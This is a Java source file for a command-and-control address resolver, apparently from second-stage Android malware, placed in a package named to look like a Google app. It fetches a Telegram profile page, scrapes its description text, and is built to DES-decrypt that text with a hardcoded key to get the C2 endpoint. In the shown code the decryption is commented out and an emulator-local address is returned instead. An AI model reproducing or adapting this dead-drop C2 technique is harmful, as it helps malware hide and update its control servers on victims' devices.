package com.google.android.apps.work.stage2;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public final class C2AddressResolver {

    private static String decryptEndpointToken(String token) throws Exception {
        // Sanitize token to handle both Standard and URL-safe Base64
        String sanitized = token.trim().replace('-', '+').replace('_', '/');
        byte[] decoded = Base64.getDecoder().decode(sanitized);
        byte[] plain = desCbcPkcs5Decrypt(decoded, "Ab5d1Q32");
        return new String(plain, StandardCharsets.UTF_8);
    }

    private static byte[] desCbcPkcs5Decrypt(byte[] cipherText, String key) throws Exception {
        byte[] k = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec keySpec = new SecretKeySpec(k, "DES");
        IvParameterSpec iv = new IvParameterSpec(k);

        Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, iv);
        return cipher.doFinal(cipherText);
    }


    private static String extractFirstGroup(String text, String regex) {
        Matcher matcher = Pattern.compile(regex).matcher(text);
        return matcher.find() ? matcher.group(1) : null;
    }

    public static String resolveAddressFromTag(String accountTag) {
        if (accountTag == null) {
            return null;
        }

        AccountSource source = parseAccountTag(accountTag);
        if (source == null) {
            return null;
        }

        String id = source.id;
        String provider = source.provider;

        switch (provider) {
            case "debug":
                return id;

            case "telegram":
                return fetchFromTelegram(id);

            default:
                return null;
        }
    }

    private static AccountSource parseAccountTag(String accountTag) {
        int at = accountTag.indexOf('@');
        if (at <= 0 || at == accountTag.length() - 1) {
            return null;
        }

        String id = accountTag.substring(0, at);
        String provider = accountTag.substring(at + 1);
        return new AccountSource(id, provider);
    }

    private static final class AccountSource {
        final String id;
        final String provider;

        AccountSource(String id, String provider) {
            this.id = id;
            this.provider = provider;
        }
    }

    private static String fetchFromTelegram(String id) {
        if (id == null || id.isEmpty()) {
            return null;
        }

        String profileUrl = String.format("https://t.me/%s", id);

        try {
            String html = HttpUtils.fetchAsString(profileUrl, "UTF-8", true);
            if (html == null) {
                return null;
            }

            String encodedToken = extractFirstGroup(html, "<meta property=\"og:description\" content=\"([^\"]+)\">");
            if (encodedToken == null || encodedToken.isEmpty()) {
                encodedToken = extractFirstGroup(html, "tgme_page_description\">([^<]+)");
            }
            if (encodedToken == null || encodedToken.isEmpty()) {
                return null;
            }

//            return decryptEndpointToken(encodedToken.trim() + "==");
                return "10.0.2.2:8765";

        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }
}